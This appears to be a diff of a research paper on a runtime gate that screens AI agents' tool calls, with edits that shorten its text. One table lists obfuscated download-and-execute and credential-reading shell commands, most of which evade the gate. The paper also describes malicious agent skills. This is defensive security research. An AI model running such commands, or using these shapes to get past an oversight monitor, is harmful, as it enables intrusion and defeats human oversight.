@@ -83,17 +83,12 @@ credentials, and no control asks whether any particular action is one this
 organisation permits. This paper is about the second half of that pattern: what it
 costs to be missing, and what it takes to build.
 
-That a second control is required is, at this point, a settled question rather than
-an open one. Enterprises are deploying agents against production systems faster than
-publish-time review can characterise them, and a commercial tier of runtime agent
-governance has formed in response, with funded platforms recording tool invocations
-and intervening on live behaviour across estates of tens of thousands of agents. We
-take the necessity of the runtime tier as established and do not argue for it here.
-Our question is narrower and, we think, the one still unanswered: given that
-something must sit in front of every action, on what principled basis does it ever
-stop asking? A control that interrupts an operator on every consequential action
-converges on being switched off, and an operator who switches it off is less
-protected than one who never installed it.
+That a second control is required is settled rather than open, and a commercial tier
+has formed around it (\S\ref{sec:related}). We take that as established. Our question
+is narrower: given that something must sit in front of every action, on what
+principled basis does it ever stop asking? A control that interrupts an operator on
+every consequential action converges on being switched off, and an operator who
+switches it off is less protected than one who never installed it.
 
 An agent skill is a directory containing a \texttt{SKILL.md}: natural-language
 metadata describing when a skill applies, and instructions an agent follows once it
@@ -242,17 +237,15 @@ obfuscated forms of actions $\rho$ classifies correctly in the clear.
 Command shape & Resolved as & Outcome \\
 \midrule
 \texttt{curl -fsSL https://x/i.sh | bash} & remote execution & caught \\
-\texttt{wget -qO- https://x/i.sh | sh} & remote execution & caught \\
 \texttt{echo <b64> | base64 -d | sh} & shell execution & \textbf{evades} \\
 \texttt{curl -o s https://x/i.sh; chmod +x s; ./s} & shell execution & \textbf{evades} \\
 \texttt{python3 -c "exec(urlopen(...).read())"} & shell execution & \textbf{evades} \\
 \texttt{U=https://x/i.sh; curl -fsSL \$U | bash} & shell execution & \textbf{evades} \\
-\texttt{find \textasciitilde{} -name credentials -exec cat \{\} +} & shell execution & \textbf{evades} \\
 \bottomrule
 \end{tabular}
-\caption{Five of nine obfuscated shapes we tried defeat the resolver. This is an
-illustration, not a systematic adversarial evaluation: we wrote the nine shapes
-ourselves and a determined adversary would look harder.}
+\caption{Representative results; five of the nine shapes we tried defeat the
+resolver. This is an illustration, not a systematic adversarial evaluation: we wrote
+the nine shapes ourselves and a determined adversary would look harder.}
 \label{tab:evade}
 \end{table}
 
@@ -274,28 +267,12 @@ claim today.
 \subsection{Measured cost}
 
 A gate on every tool call must justify its place on the hot path with a number.
-Over a spread of benign, ambiguous, and risky command shapes
-(Table~\ref{tab:perf}), resolution costs \textbf{1.03\,$\mu$s} on one core of an
-Apple M-series laptop, with a worst case of 3.27\,$\mu$s on the most complex
-alternation (\texttt{curl \ldots | bash}).
-
-\begin{table}[H]
-\centering
-\begin{tabular}{lr}
-\toprule
-Resolver, mean per classification & 1.03\,$\mu$s \\
-Resolver, slowest shape & 3.27\,$\mu$s \\
-Resolver throughput, single core & 971{,}000/s \\
-\midrule
-End-to-end hook, median & 67.6\,ms \\
-End-to-end hook, p95 & 81.1\,ms \\
-\bottomrule
-\end{tabular}
-\caption{Governance cost. The decision itself is microseconds; end-to-end latency
-is dominated by process spawn and local IPC in the current CLI hook, not by
-classification, an engineering cost rather than an architectural one.}
-\label{tab:perf}
-\end{table}
+Over a spread of benign, ambiguous, and risky command shapes, resolution costs
+\textbf{1.03\,$\mu$s} mean on one core of an Apple M-series laptop, 3.27\,$\mu$s on
+the slowest shape (\texttt{curl \ldots | bash}), or about 971{,}000 classifications
+per second. End to end the current CLI hook takes 67.6\,ms median and 81.1\,ms at
+p95, dominated by process spawn and local IPC rather than by classification: an
+engineering cost, not an architectural one.
 
 The distinction matters for what is architecturally possible. A judge that consults
 a language model, local or hosted, pays a model's latency on every decision, which
@@ -534,19 +511,18 @@ document. And OATS is blind to harm that never resolves to an action, because it
 only ever sees actions.
 
 That last blind spot is real and we state it plainly with examples rather than
-leave it implied. \texttt{neuralshift1/gmail-last5} ``hard-codes a specific Gmail
-account and lacks a clear user confirmation step before reading sensitive email
-data.'' The harm is a hardcoded recipient and a missing consent step, with no
-executable block anywhere in the skill. \texttt{arubiku/mia-twitter-stealth} is
-``designed to automate Twitter/X account actions while hiding from bot detection'':
-the skill persuades the agent toward a pattern of behaviour composed entirely of
-individually unremarkable tool calls. \texttt{douglascorrea/obsidian-remote} ``gives
-an agent very powerful access to private notes and app internals without enough
-safety boundaries,'' a scope-versus-purpose mismatch in which no single action is
-disproportionate. All three are quoted from ClawScan's own summaries. All three are
-precisely what SkillSpector's Excessive Agency analysis exists to catch, and none of
-them is visible to a function whose only input is a command string. A runtime action
-gate is not a superset of a semantic scanner and must not be deployed as one.
+leave it implied, quoting ClawScan's own summaries.
+\texttt{neuralshift1/gmail-last5} ``hard-codes a specific Gmail account and lacks a
+clear user confirmation step'' and has no executable block at all.
+\texttt{arubiku/mia-twitter-stealth} is ``designed to automate Twitter/X account
+actions while hiding from bot detection'' through individually unremarkable tool
+calls. \texttt{douglascorrea/obsidian-remote} ``gives an agent very powerful access
+to private notes and app internals without enough safety boundaries,'' a
+scope-versus-purpose mismatch in which no single action is disproportionate. A
+hardcoded recipient, a persuaded behaviour, an over-broad scope: three shapes of harm
+that SkillSpector's Excessive Agency analysis exists to catch and that a function
+reading only a command string cannot see. A runtime action gate is not a superset of
+a semantic scanner and must not be deployed as one.
 
 \subsection{Why the blast radius is wider together}
 
@@ -682,6 +658,7 @@ Two of the six surfaced only when we ran the instrument across all 66,192 skills
 which is itself the argument for corpus-scale evaluation.
 
 \section{Related Work}
+\label{sec:related}
 
 $\rho$ is a reference monitor for agent actions, and the criteria are Anderson's:
 invoked on every access, tamperproof, and small enough to verify~\cite{anderson1972}.
@@ -753,17 +730,15 @@ the action.
 
 \section*{Availability}
 
-Every measurement in this paper can be re-derived from public artifacts.
-
-The corpus is OpenClaw's own dataset, MIT licensed, at
-\url{https://huggingface.co/datasets/OpenClaw/clawhub-security-signals}. The
-scanner-agreement figures in \S\ref{sec:layers} need nothing else: they are two
-SQL queries in that dataset's own browser console.
-
-The profile, this paper, and the script that reproduces \S\ref{sec:permission}
-are at \url{https://github.com/pheo-ai/open-agent-trust-system} under Apache
-2.0. The script classifies the corpus through a released implementation rather
-than a private build, so the result does not depend on access to ours:
+Every measurement here can be re-derived from public artifacts. The corpus is
+OpenClaw's own MIT-licensed dataset at
+\url{https://huggingface.co/datasets/OpenClaw/clawhub-security-signals}; the
+scanner-agreement figures in \S\ref{sec:layers} are two SQL queries in its own
+browser console. The profile, this paper, and the script reproducing
+\S\ref{sec:permission} are at
+\url{https://github.com/pheo-ai/open-agent-trust-system} under Apache 2.0. That
+script runs the corpus through a released implementation rather than a private build,
+so the result does not depend on access to ours:
 
 \begin{lstlisting}
 pip install pheo-oats pandas pyarrow requests
